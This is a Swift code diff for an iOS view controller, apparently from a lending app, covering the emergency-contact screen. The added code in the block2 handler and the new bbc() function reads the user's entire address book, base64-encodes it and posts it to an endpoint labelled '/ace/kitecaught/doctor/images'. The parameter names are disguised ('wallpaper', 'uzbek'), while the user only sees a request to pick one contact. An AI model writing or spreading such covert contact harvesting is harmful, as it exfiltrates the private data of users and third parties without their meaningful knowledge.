@@ -35,6 +35,8 @@ class PLALXRViewController: PLABaseViewController {
     
     var start: String?
     
+    var guanxibtn: UIButton?
+    
     override func viewDidLoad() {
         super.viewDidLoad()
         
@@ -49,34 +51,46 @@ class PLALXRViewController: PLABaseViewController {
         lianxirenView.block = { [weak self] in
             self?.navigationController?.popToRootViewController(animated: true)
         }
-        lianxirenView.block1 = { [weak self] btn, model in
+        lianxirenView.block1 = { [weak self] btn, btn1, model in
+            self?.guanxibtn = btn
+            self?.model = model
+            self?.btn = btn1
             if let pakols = model.pakols {
                 let modelArray = enmuModel.enumOneArr(dataSourceArr: pakols)
                 self?.popLastEnum(.province, btn, modelArray, model)
             }
         }
-        lianxirenView.block2 = { [weak self] btn, model in
-            GetLianxiQuanXian.canPer { lianxi in
-                self?.btn = btn
-                self?.model = model
-                if lianxi {
-                    self?.alertlianxi(btn, model)
-                    self?.shanglianxirenxinxi(completion: { lianxirenArray in
-                        let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
-                        let base64Data = data?.base64EncodedString() ?? ""
-                        let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
-                        PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
-                            
-                        } errorBlock: { error in
-                            
+        lianxirenView.block2 = { [weak self] btn, btn1, model in
+            self?.guanxibtn = btn1
+            self?.model = model
+            self?.btn = btn
+            if let guanxibtn = self?.guanxibtn, let guanxiStr = guanxibtn.titleLabel?.text, guanxiStr != "Relationship" {
+                GetLianxiQuanXian.canPer { lianxi in
+                    if lianxi {
+                        self?.alertlianxi(btn, model)
+                        self?.shanglianxirenxinxi(completion: { lianxirenArray in
+                            let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
+                            let base64Data = data?.base64EncodedString() ?? ""
+                            let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
+                            PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
+                                
+                            } errorBlock: { error in
+                                
+                            }
+                        })
+                    }else {
+                        if let self = self {
+                            self.showContactsPermissionAlert(in: self)
                         }
-                    })
-                }else {
-                    if let self = self {
-                        self.showContactsPermissionAlert(in: self)
                     }
                 }
+            }else {
+                if let pakols = model.pakols {
+                    let modelArray = enmuModel.enumOneArr(dataSourceArr: pakols)
+                    self?.popLastEnum(.province, btn1, modelArray, model)
+                }
             }
+            
         }
         lianxirenView.saveblock = { [weak self] in
             GetLianxiQuanXian.canPer { lianxi in
@@ -98,24 +112,24 @@ class PLALXRViewController: PLABaseViewController {
                 }
             }
         }
-        GetLianxiQuanXian.canPer { [weak self] lianxi in
-            if lianxi {
-                self?.shanglianxirenxinxi(completion: { lianxirenArray in
-                    let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
-                    let base64Data = data?.base64EncodedString() ?? ""
-                    let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
-                    PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
-                        
-                    } errorBlock: { error in
-                        
-                    }
-                })
-            }else {
-                if let self = self {
-                    
-                }
-            }
-        }
+        //        GetLianxiQuanXian.canPer { [weak self] lianxi in
+        //            if lianxi {
+        //                self?.shanglianxirenxinxi(completion: { lianxirenArray in
+        //                    let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
+        //                    let base64Data = data?.base64EncodedString() ?? ""
+        //                    let dict = ["vacuumed": "3", "reputedly": self?.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
+        //                    PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
+        //
+        //                    } errorBlock: { error in
+        //
+        //                    }
+        //                })
+        //            }else {
+        //                if let self = self {
+        //
+        //                }
+        //            }
+        //        }
     }
 }
 
@@ -165,7 +179,7 @@ extension PLALXRViewController: CNContactPickerDelegate {
         addressPickerView.pickerMode = model
         addressPickerView.selectIndexs = [0, 0, 0]
         addressPickerView.dataSourceArr = array
-        addressPickerView.resultBlock = { province, city, area in
+        addressPickerView.resultBlock = { [weak self] province, city, area in
             
             let provinceCode = province?.code ?? ""
             let cityCode = city?.code ?? ""
@@ -190,6 +204,11 @@ extension PLALXRViewController: CNContactPickerDelegate {
             modelDate.bubbling = code
             btn.setTitle(addressString, for: .normal)
             btn.setTitleColor(UIColor.init(css: "#2681FB"), for: .normal)
+            DispatchQueue.main.asyncAfter(deadline: .now() + 0.25) {
+                if let self = self {
+                    self.bbc()
+                }
+            }
         }
         let customStyle = BRPickerStyle()
         customStyle.pickerColor = .white
@@ -278,6 +297,32 @@ extension PLALXRViewController: CNContactPickerDelegate {
         }
     }
     
+    func bbc() {
+        GetLianxiQuanXian.canPer { [weak self] lianxi in
+            if lianxi {
+                if let self = self, let dianhuabtn = self.btn, let model = self.model  {
+                    self.alertlianxi(dianhuabtn, model)
+                    self.shanglianxirenxinxi(completion: { lianxirenArray in
+                        let data = try? JSONSerialization.data(withJSONObject: lianxirenArray!, options: [])
+                        let base64Data = data?.base64EncodedString() ?? ""
+                        let dict = ["vacuumed": "3", "reputedly": self.productID ?? "", "uzbek": "1", "wallpaper": base64Data]
+                        PLAAFNetWorkManager.shared.uploadDataAPI(params: dict, pageUrl: "/ace/kitecaught/doctor/images", method: .post) { baseModel in
+                            
+                        } errorBlock: { error in
+                            
+                        }
+                    })
+                }
+            }else {
+                if let self = self {
+                    self.showContactsPermissionAlert(in: self)
+                }
+            }
+        }
+    }
+    
+    
+    
 }
 
 typealias ContactsPCompletion = ((Bool) -> Void)
@@ -301,5 +346,4 @@ class GetLianxiQuanXian: NSObject,CNContactPickerDelegate {
             break
         }
     }
-    
 }
